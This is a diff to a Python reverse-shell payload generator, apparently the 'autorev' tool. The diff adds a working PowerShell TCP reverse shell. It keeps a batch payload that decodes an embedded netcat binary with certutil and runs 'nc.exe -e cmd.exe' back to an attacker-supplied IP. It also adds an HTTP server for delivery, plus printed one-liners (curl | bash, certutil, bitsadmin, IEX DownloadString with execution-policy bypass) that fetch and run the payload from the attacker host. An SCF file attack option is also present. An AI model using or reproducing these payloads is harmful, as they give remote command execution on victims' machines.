@@ -2,6 +2,8 @@
 import sys
 import argparse
 import os
+import http.server
+import socketserver
 class bcolors:
     HEADER = '\033[95m'
     OKBLUE = '\033[94m'
@@ -13,12 +15,12 @@ class bcolors:
     BOLD = '\033[1m'
     UNDERLINE = '\033[4m'
 banner = f'''{bcolors.OKCYAN}
-░█████╗░██╗░░░██╗████████╗░█████╗░██████╗░███████╗██╗░░░██╗░░░░██████╗██╗░░██╗                                                                                               
-██╔══██╗██║░░░██║╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██║░░░██║░░░██╔════╝██║░░██║                                                                                               
-███████║██║░░░██║░░░██║░░░██║░░██║██████╔╝█████╗░░╚██╗░██╔╝░░░╚█████╗░███████║
-██╔══██║██║░░░██║░░░██║░░░██║░░██║██╔══██╗██╔══╝░░░╚████╔╝░░░░░╚═══██╗██╔══██║
-██║░░██║╚██████╔╝░░░██║░░░╚█████╔╝██║░░██║███████╗░░╚██╔╝░░██╗██████╔╝██║░░██║
-╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚═╝╚═════╝░╚═╝░░╚═╝
+              __                                   __    
+.---.-.--.--.|  |_.-----.----.-----.--.--. .-----.|  |--.
+|  _  |  |  ||   _|  _  |   _|  -__|  |  |_|__ --||     |
+|___._|_____||____|_____|__| |_____|\\___/__|_____||__|__|
+
+😍 {bcolors.WARNING}Made with <3 By BoyFromFuture{bcolors.OKCYAN}
 -------------------------------------------------------------------------------{bcolors.ENDC}
  {bcolors.WARNING}Github  ❯ https://github.com/root-tanishq/autorev.sh/{bcolors.ENDC}
  {bcolors.WARNING}Twitter ❯ https://twitter.com/root_tanishq{bcolors.OKCYAN}
@@ -28,8 +30,8 @@ parser = argparse.ArgumentParser()
 parser.add_argument('-i','--ipaddr', type=str,help='LHOST',required=True)
 parser.add_argument('-p','--port', type=int ,help='LPORT [Default 9001]',default=9001)
 parser.add_argument('-o','--out', type=str ,help='Output File Name [Excluding (.)extension Extension][OPTIONAL]',default="autorev")
-parser.add_argument('-f','--format',type=str,help='Define Format for generator [lin | win | scf][Default=lin]',default='lin')
-parser.add_argument('-s','--shell',type=str,help='Please define a shell for windows[cmd / powershell][Default=cmd]',default='cmd')
+parser.add_argument('-f','--format',type=str,help='Define Format for generator [lin | win[c/p](c = cmd | p = powershell) | scf][Default=lin]',default='lin')
+parser.add_argument('-s','--server',type=int,help='Define Port for http server (Default 80)]',default=80)
 args = parser.parse_args()
 # nc code
 script = f'''
@@ -122,7 +124,14 @@ echo goAICBWaXJ0dWFsUXVlcnkgZmFpbGVkIGZvciAlZCBieXRlcyBhdCBhZGRyZXNzICVwAAAAACAg
 echo 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 >> nc.encode
 echo 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 >> nc.encode
 certutil.exe -decode nc.encode nc.exe
-.\\nc.exe -e {args.shell}.exe {args.ipaddr} {args.port}
+.\\nc.exe -e cmd.exe {args.ipaddr} {args.port}
+'''
+# Powershell Basic Reverse Shell
+powsh = f'''
+$client = New-Object System.Net.Sockets.TCPClient('{args.ipaddr}',{args.port});
+'''
+powsh +='''
+$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 '''
 # SCF file attack
 scf = f'''
@@ -135,16 +144,30 @@ Command=ToggleDesktop
 format = args.format
 if format == "lin":
     open(f'{args.out}.sh','w').write(script)
-    print(f'{bcolors.OKGREEN}[+]{bcolors.ENDC}Generated linux shell file "{args.out}.sh" for {args.ipaddr}:{args.port}')
-    print(f'{bcolors.OKGREEN}[+]{bcolors.ENDC}Command "curl"{bcolors.WARNING}❯ curl http://{args.ipaddr}/{args.out}.sh | bash')
-    print(f'{bcolors.OKGREEN}[+]{bcolors.ENDC}Command "wget"{bcolors.WARNING}❯ wget http://{args.ipaddr}/{args.out}.sh -O /tmp/{args.out}.sh && bash /tmp/{args.out}.sh')
-elif format == "win":
+    print(f'{bcolors.OKGREEN}[+]{bcolors.ENDC}👨‍💻 Generated linux shell file "{args.out}.sh" for {args.ipaddr}:{args.port}')
+    print(f'{bcolors.OKGREEN}[+]{bcolors.ENDC}Command "curl"{bcolors.WARNING}❯ curl http://{args.ipaddr}:{args.server}/{args.out}.sh | bash')
+    print(f'{bcolors.OKGREEN}[+]{bcolors.ENDC}Command "wget"{bcolors.WARNING}❯ wget http://{args.ipaddr}:{args.server}/{args.out}.sh -O /tmp/{args.out}.sh && bash /tmp/{args.out}.sh')
+elif format == "winc":
     open(f'{args.out}.bat','w').write(winsh)
-    print(f'{bcolors.OKGREEN}[+]{bcolors.ENDC}Generated windows batch file "{args.out}.bat" for {args.ipaddr}:{args.port}')
-    print(f'{bcolors.OKGREEN}[+]{bcolors.ENDC}Command "certutil"{bcolors.WARNING}❯ certutil.exe -urlcache -split -f http://{args.ipaddr}/{args.out}.bat %temp%/{args.out}.bat && %temp%/{args.out}.bat')
-    print(f'{bcolors.OKGREEN}[+]{bcolors.ENDC}Command "impacket-smbserver"{bcolors.WARNING}❯ copy \\\\{args.ipaddr}\\<share-name>\\{args.out}.bat %temp%\\{args.out}.bat && %temp%/{args.out}.bat')
+    print(f'{bcolors.OKGREEN}[+]{bcolors.ENDC}👨‍💻 Generated windows batch file "{args.out}.bat" for {args.ipaddr}:{args.port}')
+    print(f'{bcolors.OKGREEN}[+]{bcolors.ENDC}Command "certutil"{bcolors.WARNING}❯ certutil.exe -urlcache -split -f http://{args.ipaddr}:{args.server}/{args.out}.bat %temp%/{args.out}.bat && %temp%\\{args.out}.bat')
+    print(f'{bcolors.OKGREEN}[+]{bcolors.ENDC}Command "bitsadmin"{bcolors.WARNING}❯ bitsadmin /create 1 bitsadmin /addfile 1 http://{args.ipaddr}:{args.server}/{args.out}.bat %temp%\\{args.out}.bat bitsadmin /RESUME 1 bitsadmin /complete 1')
+elif format == "winp":
+    open(f'{args.out}.ps1','w').write(powsh)
+    print(f'{bcolors.OKGREEN}[+]{bcolors.ENDC}👨‍💻 Generated windows ps1 file "{args.out}.ps1" for {args.ipaddr}:{args.port}')
+    print(f'{bcolors.OKGREEN}[+]{bcolors.ENDC}Command "IWR"{bcolors.WARNING}❯ mkdir \\bff ;IWR -Uri http://{args.ipaddr}:{args.server}/{args.out}.ps1 -OutFile \\bff\\{args.out}.ps1 ; powershell.exe -ep bypass Import-Module \\bff\\{args.out}.ps1')
+    print(f'{bcolors.OKGREEN}[+]{bcolors.ENDC}Command "IEX"{bcolors.WARNING}❯ powershell.exe -ep bypass -Command \"IEX(New-Object Net.WebClient).DownloadString(\'http://{args.ipaddr}:{args.server}/{args.out}.ps1\')\"')
 elif format == 'scf':
     open(f'@{args.out}.scf','w').write(scf)
-    print(f'{bcolors.OKGREEN}[+]{bcolors.ENDC}Generated scf file "@{args.out}.scf" for {args.ipaddr}')
+    print(f'{bcolors.OKGREEN}[+]{bcolors.ENDC}👨‍💻 Generated scf file "@{args.out}.scf" for {args.ipaddr}')
 else:
     print("Only [lin | win | scf] formats are available")
+
+# Creating a portable server
+try:
+    Handler = http.server.SimpleHTTPRequestHandler
+    print(f'{bcolors.WARNING}✅ After Getting the reverse shell please kill it with Ctrl+C{bcolors.OKGREEN}')
+    with socketserver.TCPServer((args.ipaddr, args.server), Handler) as httpd:
+        httpd.serve_forever()
+except:
+    print(f'{bcolors.WARNING}Enjoy the Reverse Shell!!😎{bcolors.ENDC}')
